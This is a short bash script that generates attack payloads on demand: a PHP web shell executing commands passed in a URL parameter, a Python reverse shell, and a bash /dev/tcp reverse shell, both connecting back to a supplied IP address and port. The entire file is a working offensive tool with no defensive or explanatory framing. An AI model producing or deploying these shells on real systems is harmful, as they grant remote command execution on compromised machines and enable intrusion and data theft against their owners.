#!/bin/bash
IP="$1"
PORT="$2"
TYPE="${3:-php}"

case "$TYPE" in
  php)
    echo "<?php system(\$_GET['cmd']); ?>" > shell.php
    ;;
  python)
    echo "import socket,subprocess,os;s=socket.socket();s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"]);" > shell.py
    ;;
  bash)
    echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" > shell.sh
    ;;
esac

echo "[+] $TYPE webshell saved as shell.$TYPE"

